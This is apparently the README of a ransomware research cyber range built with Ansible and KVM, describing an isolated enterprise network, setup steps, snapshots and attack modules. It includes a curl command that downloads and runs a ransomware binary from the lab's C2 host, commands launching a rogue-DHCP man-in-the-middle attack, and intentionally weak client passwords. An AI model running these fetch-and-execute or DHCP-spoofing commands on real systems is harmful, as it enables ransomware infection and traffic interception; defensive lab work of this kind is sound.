# 🔐 ENTRAP Cyber Range using Ansible and KVM

A fully automated enterprise cyber range built using **Ansible**, **KVM/QEMU**, **Libvirt**, **Cloud-init**, and **Ubuntu Server Cloud Images**.

The cyber range provides a reproducible, isolated, enterprise-style environment for ransomware behavior analysis, malware execution testing, backup and recovery validation, DNS/DHCP infrastructure testing, incident response experiments, and network traffic analysis.

---

## 📖 Overview

Modern ransomware attacks target enterprise environments containing critical infrastructure services such as DNS, DHCP, backup servers, and endpoint systems. Reproducing such environments manually is time-consuming, error-prone, and difficult to scale.

This project addresses that challenge by deploying a small enterprise network using Infrastructure-as-Code (IaC) principles. The framework provisions multiple virtual machines, configures enterprise services automatically, and creates reusable snapshots for repeatable malware experimentation.

The testbed allows researchers to safely evaluate:

- Ransomware propagation behavior
- Impact on enterprise infrastructure
- Backup recovery workflows
- Network-based detection approaches
- Incident response mechanisms
- Forensic data collection strategies

---

## 🏗️ Lab Architecture

### Virtual Machines

| VM          | Role              | Technology         | IP Address        | Network        |
|-------------|-------------------|--------------------|-------------------|----------------|
| gateway1    | NAT Router        | nftables           | 10.10.0.1 / 173.168.0.10 | link-net / wan-net |
| coreswitch  | Internal Router   | iptables + DHCP relay | 10.10.10.1 / 10.10.20.1 / 10.10.0.2 | infra-net / client-net / link-net |
| dns1        | DNS Server        | BIND9              | 10.10.10.53       | infra-net      |
| dhcp1       | DHCP Server       | Kea DHCP           | 10.10.10.2        | infra-net      |
| backup1     | Backup Server     | Samba              | 10.10.10.20       | infra-net      |
| client1     | Enterprise Client | Ubuntu             | Dynamic (10.10.20.150–200) | client-net |
| c2server    | C2 / RaaS Server  | Flask + PyInstaller binaries | 173.168.0.50 | wan-net |

### Network Topology

```
Host Machine
    │
    ├── virbr1 (wan-net, 173.168.0.0/24) ──── gateway1 (enp2s0, 173.168.0.10)
    │                                    │          │
    │                              c2server          │
    │                            (173.168.0.50)  gateway1 (enp1s0, 10.10.0.1)
    │                            Flask C2/RaaS       │  NAT + nftables
    ├── virbr2 (link-net, 10.10.0.0/24) ────────────┤
    │                                                │
    │                                         coreswitch (enp3s0, 10.10.0.2)
    │                                         routes: infra ↔ client ↔ uplink
    │                                                │
    ├── virbr3 (infra-net, 10.10.10.0/24) ──────────┤── dns1 (.53), dhcp1 (.2), backup1 (.20)
    │                                                │
    └── virbr4 (client-net, 10.10.20.0/24) ─────────┘── client1 (dynamic)
```

- **gateway1** is the sole NAT/internet exit (masquerades on wan-net)
- **coreswitch** routes between infra-net, client-net, and uplink to gateway1 — no NAT
- **c2server** sits on wan-net (173.168.0.50) — reachable from clients via gateway1 masquerade; hosts Flask C2 on port 80
- **All internal bridges are isolated** (no libvirt host IP/forwarding) — host has no direct route to infra/client nets
- **Ansible reaches infra VMs via ProxyJump** through gateway1 (173.168.0.10)

### Underlying Stack

| Layer            | Technology               |
|------------------|--------------------------|
| Virtualization   | KVM/QEMU                 |
| VM Management    | Libvirt                  |
| Automation       | Ansible                  |
| VM Bootstrap     | Cloud-init               |
| Base Image       | Ubuntu 22.04 Cloud Image |
| Routing/NAT      | nftables (gateway1), iptables (coreswitch) |
| DHCP             | Kea DHCP4                |
| DNS              | BIND9                    |
| File Sharing     | Samba                    |

---

## 📂 Project Structure

```text
RansomwareTestbed/
├── attacks/                        Attack modules
│   ├── GonnaCry/                   RaaS module
│   │   ├── src/
│   │   │   ├── GonnaCry/           Encryptor + decryptor Python source
│   │   │   └── Server/             C2 Flask server
│   │   │       ├── server.py
│   │   │       ├── private_key.key
│   │   │       ├── public_key.key
│   │   │       └── binaries/       Pre-built ELF binaries (build on Ubuntu)
│   │   ├── build_binaries.sh       PyInstaller build script (run on Ubuntu)
│   │   └── keygen_server.py        RSA-2048 keypair generator
│   ├── dhcp_attack_combined.sh     DHCP exhaustion + rogue DHCP (MitM)
│   ├── dhcp_exhaustion.py
│   ├── mitm_intercept.sh
│   └── rogue_dhcp_server.sh
├── configs/
│   ├── firewall/
│   │   └── gateway.nft
│   └── network/
│       ├── wan-net.xml
│       ├── link-net.xml
│       ├── infra-net.xml
│       └── client-net.xml
├── inventory/
│   └── hosts.ini
├── playbooks/
│   ├── group_vars/
│   │   └── all.yml
│   ├── site.yml
│   ├── 00_create_networks.yml
│   ├── create_gateway_vm.yml
│   ├── create_coreswitch_vm.yml
│   ├── create_infra_vms.yml
│   ├── create_client_vms.yml
│   ├── create_c2_vm.yml
│   ├── configure_gateway.yml
│   ├── configure_coreswitch.yml
│   ├── configure_dns.yml
│   ├── configure_dhcp.yml
│   ├── configure_backup.yml
│   ├── configure_c2.yml
│   ├── deploy_attack_scripts.yml
│   ├── snapshots.yml
│   ├── destroy_clients.yml
│   └── destroy_lab.yml
└── captures/
```

---

## 🛠️ Prerequisites

### Host System Requirements

- Ubuntu 22.04 or later
- Hardware virtualization enabled (Intel VT-x / AMD-V)
- Minimum 16 GB RAM recommended
- KVM virtualization support

### Install Required Packages

```bash
sudo apt update

sudo apt install -y \
  ansible \
  sshpass \
  qemu-kvm \
  libvirt-daemon-system \
  virtinst \
  genisoimage \
  cloud-image-utils \
  python3-libvirt
```

### Enable Libvirt

```bash
sudo systemctl enable libvirtd
sudo systemctl start libvirtd
```

## Verify Virtualization & KVM

Check hardware virtualization support:

```bash
egrep -c '(vmx|svm)' /proc/cpuinfo
```

Expected output:

```text
> 0
```

Install KVM verification utilities:

```bash
sudo apt install -y cpu-checker
```

Verify KVM acceleration:

```bash
sudo kvm-ok
```

Expected output:

```text
KVM acceleration can be used
```

Verify libvirt service:

```bash
sudo systemctl status libvirtd
```

---

## 🗂️ Setup

### 1. Clone the Repository

```bash
git clone https://github.com/LetsBeSecure/RansomwareTestbed.git
cd RansomwareTestbed
```

### 2. Download the Ubuntu Cloud Image

```bash
sudo mkdir -p /var/lib/libvirt/images/ransomware_lab
cd /var/lib/libvirt/images/ransomware_lab
sudo wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img
```

### 3. Inventory

File: `inventory/hosts.ini`

```ini
[gateway]
10.10.0.1 ansible_host=173.168.0.10

[coreswitch]
10.10.10.1

[dhcp]
10.10.10.2

[dns]
10.10.10.53

[backup]
10.10.10.20

[web]
10.10.10.10

[clients]
# clients get dynamic IPs from DHCP - add manually after deployment

[infra_net:children]
coreswitch
dhcp
dns
backup
web

[infra_net:vars]
ansible_ssh_common_args='-o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p {{ infra_admin_user }}@173.168.0.10"'

[all:vars]
ansible_user={{ infra_admin_user }}
ansible_ssh_private_key_file={{ infra_ssh_private_key_path }}

# Client VMs: intentionally weak credentials (attack surface)
[clients:vars]
ansible_user={{ client_user }}
ansible_password={{ client_password }}
ansible_ssh_common_args='-o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p {{ infra_admin_user }}@173.168.0.10"'
```

> **Note:** Infra-net and client-net are isolated bridges — the host has no direct route there. Ansible reaches all internal VMs (coreswitch, dns1, dhcp1, backup1, clients) via ProxyJump through gateway1 (173.168.0.10). gateway1 is reachable directly on its WAN interface.

---

## 🚀 Deployment

### Deploy the Complete Lab

Run the following command to deploy the entire testbed:

```bash
sudo ansible-playbook -i inventory/hosts.ini playbooks/site.yml
```

This automatically performs the following steps in order:

1. Creates all 4 libvirt networks (wan-net, link-net, infra-net, client-net)
2. Creates and configures gateway1 (NAT router)
3. Creates and configures coreswitch (internal router + DHCP relay)
4. Provisions infra VMs (dns1, dhcp1, backup1)
5. Configures DNS, DHCP, and backup services
6. Provisions client VMs

> **Note:** During first boot, cloud-init initialization may take 1–3 minutes depending on system resources.

### Individual Playbooks

Each step can also be executed independently:

```bash
# Create all networks
sudo ansible-playbook -i inventory/hosts.ini playbooks/00_create_networks.yml

# Create gateway VM
sudo ansible-playbook -i inventory/hosts.ini playbooks/create_gateway_vm.yml

# Configure gateway (IP forwarding, NAT, static routes)
sudo ansible-playbook -i inventory/hosts.ini playbooks/configure_gateway.yml

# Create coreswitch VM
sudo ansible-playbook -i inventory/hosts.ini playbooks/create_coreswitch_vm.yml

# Configure coreswitch (routing, DHCP relay)
sudo ansible-playbook -i inventory/hosts.ini playbooks/configure_coreswitch.yml

# Create infra VMs (dns1, dhcp1, backup1)
sudo ansible-playbook -i inventory/hosts.ini playbooks/create_infra_vms.yml

# Configure DNS server
sudo ansible-playbook -i inventory/hosts.ini playbooks/configure_dns.yml

# Configure DHCP server
sudo ansible-playbook -i inventory/hosts.ini playbooks/configure_dhcp.yml

# Configure backup server
sudo ansible-playbook -i inventory/hosts.ini playbooks/configure_backup.yml
```

### Verify Deployment

```bash
# List all networks
sudo virsh net-list --all

# List virtual machines
sudo virsh list --all
```

Expected virtual machines:

- `gateway1`
- `coreswitch`
- `dns1`
- `dhcp1`
- `backup1`
- `client1`
- `c2server`

---

## 🔧 Usage

### SSH Access

Credentials are split by VM group:

| Group | User | Auth |
|-------|------|------|
| gateway1, coreswitch, dns1, dhcp1, backup1, web1, c2server | `admin` | SSH key (`~/.ssh/id_ed25519`) |
| client1, client2, … | `student` | password `student` |

**gateway1** — direct on WAN interface:

```bash
ssh -i ~/.ssh/id_ed25519 admin@173.168.0.10
```

**c2server** — direct on WAN interface:

```bash
ssh -i ~/.ssh/id_ed25519 admin@173.168.0.50
```

**Infra VMs** (coreswitch, dns1, dhcp1, backup1, web1) — ProxyJump through gateway1:

```bash
# pattern: ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@<IP>
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.53   # dns1
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.2    # dhcp1
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.20   # backup1
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.10   # web1
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.1    # coreswitch
```

**Client VMs** — dynamic IPs; find them first, then ProxyJump through gateway1:

```bash
# List active client IPs from dhcp1 lease file
ssh -i ~/.ssh/id_ed25519 -o ProxyJump=admin@173.168.0.10 admin@10.10.10.2 \
  "awk -F',' 'NR>1 && \$10==\"0\" {print \$1}' /var/lib/kea/kea-leases4.csv"

# Connect to a client (replace IP; enter password: student)
ssh -o ProxyCommand="ssh -i ~/.ssh/id_ed25519 -W %h:%p admin@173.168.0.10" \
    -o StrictHostKeyChecking=no student@10.10.20.151
```

### Access a VM Console

```bash
virsh console dhcp1
```

Inside the VM:

```bash
ip a
```

Exit the console with `CTRL + ]`.

### Snapshot Management

Snapshots are automatically created with the name `clean-state`, useful for ransomware rollback, malware experimentation, forensic recovery, and repeatable testing.

Restore a VM to its clean state:

```bash
sudo virsh snapshot-revert client1 clean-state
```

### Ransomware Experimentation Workflow

A typical evaluation workflow:

1. Deploy the enterprise infrastructure.
2. Confirm clean-state VM snapshots exist.
3. Transfer ransomware samples into `client1`.
4. Execute the samples inside the isolated environment.
5. Monitor:
   - Network traffic
   - File system activity
   - Backup server interactions
   - DNS/DHCP behavior
6. Restore VMs from snapshots.
7. Repeat experiments safely.

---

## 🎯 Attack Modules

### GonnaCry — RaaS (Ransomware-as-a-Service)

Full ransomware-as-a-service simulation. C2 server hosts pre-built ELF binaries; victims download and execute via a simulated phishing link.

**Crypto chain:** AES-256-GCM per file → RSA-2048 client keypair → client private key encrypted with server public key → server holds private key for decryption.

**Deploy C2 server:**

```bash
ansible-playbook -i inventory/hosts.ini playbooks/create_c2_vm.yml -e "project_root=$(pwd)"
ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e "project_root=$(pwd)"
```

**Simulate phishing click on victim (client1):**

```bash
# Phase 1 — infection
curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry \
  && chmod +x /tmp/gonnacry && /tmp/gonnacry

# Phase 3 — decryption (after payment)
curl -s http://173.168.0.50/download-decryptor/ -o /tmp/decryptor \
  && chmod +x /tmp/decryptor && /tmp/decryptor
```

See `attacks/GonnaCry/README.md` for full architecture, keypair setup, and binary build instructions.

---

### DHCP MitM Attack

Rogue DHCP + ARP poisoning to intercept client traffic. Two modes: stealth (observe only) and mitm (active intercept).

**Deploy attack scripts to attacker VM:**

```bash
ansible-playbook -i inventory/hosts.ini playbooks/deploy_attack_scripts.yml
```

**Run from attacker VM:**

```bash
# Exhaust DHCP pool, then serve rogue DHCP with attacker as gateway
sudo bash /opt/attacks/dhcp_attack_combined.sh mitm

# Intercept and log traffic
sudo bash /opt/attacks/mitm_intercept.sh
```

---

## 🔄 Redeployment & Teardown

### Destroy the Lab

Tear down all VMs and networks:

```bash
sudo ansible-playbook -i inventory/hosts.ini playbooks/destroy_lab.yml
```

### Redeploy

```bash
sudo ansible-playbook -i inventory/hosts.ini playbooks/site.yml
```

---

# 🌐 Internal Enterprise DNS Validation

After deployment, the enterprise infrastructure uses the internally deployed DNS server (`10.10.10.53`) for name resolution within infra-net and client-net.

Validate from a VM:

```bash
dig dns1.enterprise.lab
```

Expected output:

```text
dns1.enterprise.lab.    IN    A    10.10.10.53
```

Additional examples:

```bash
dig backup1.enterprise.lab
dig dhcp1.enterprise.lab
ping dns1.enterprise.lab
```

---

## ℹ️ Note on `127.0.0.53`

Ubuntu uses `systemd-resolved` as a local DNS stub resolver.

Therefore, commands such as `dig` may show:

```text
SERVER: 127.0.0.53
```

This is normal behavior. The local resolver forwards DNS requests to the configured enterprise DNS server (`10.10.10.53`).

---

## ⚠️ Open vSwitch Warning

During `netplan apply`, Ubuntu may display:

```text
WARNING:root:Cannot call Open vSwitch: ovsdb-server.service is not running.
```

This warning is harmless. The testbed uses libvirt isolated bridges and standard Linux bridges — no Open vSwitch dependency.

---

## 🧯 Troubleshooting

### VM Already Exists

If a VM definition blocks redeployment, remove it manually:

```bash
sudo virsh destroy <vm-name>
sudo virsh undefine <vm-name> --snapshots-metadata
sudo rm -f /var/lib/libvirt/images/ransomware_lab/<vm-name>.qcow2
sudo rm -f /var/lib/libvirt/images/ransomware_lab/<vm-name>-seed.iso
```

### Common Issues

| Issue                        | Possible Cause                          | Solution                                         |
|------------------------------|-----------------------------------------|--------------------------------------------------|
| SSH timeout to infra VMs     | cloud-init still running                | Wait 1–3 minutes after boot                      |
| Ansible can't reach infra VM | ProxyJump misconfigured or gateway down | Verify gateway1 SSH works (`ssh -i ~/.ssh/id_ed25519 admin@173.168.0.10`) |
| VM creation fails            | Existing VM definitions                 | Undefine old VMs (see above)                     |
| Disk already in use          | Stale libvirt definitions               | Remove old VM disk images                        |
| Network unreachable          | libvirt network not active              | `sudo virsh net-start <network-name>`            |
| No VM IP address             | netplan configuration issue             | Check cloud-init logs: `sudo cloud-init status`  |
| No internet from infra VMs   | gateway1 NAT or routes missing          | Re-run `configure_gateway.yml`                   |

---

## 📚 References

- [Ansible Documentation](https://docs.ansible.com/)
- [Libvirt Documentation](https://libvirt.org/docs.html)
- [KVM Documentation](https://www.linux-kvm.org/)
- [Cloud-init Documentation](https://cloudinit.readthedocs.io/)
- [Ubuntu Cloud Images](https://cloud-images.ubuntu.com/)
- [BIND9 Documentation](https://bind9.readthedocs.io/)
- [Kea DHCP Documentation](https://kea.readthedocs.io/)
- [Samba Documentation](https://www.samba.org/samba/docs/)
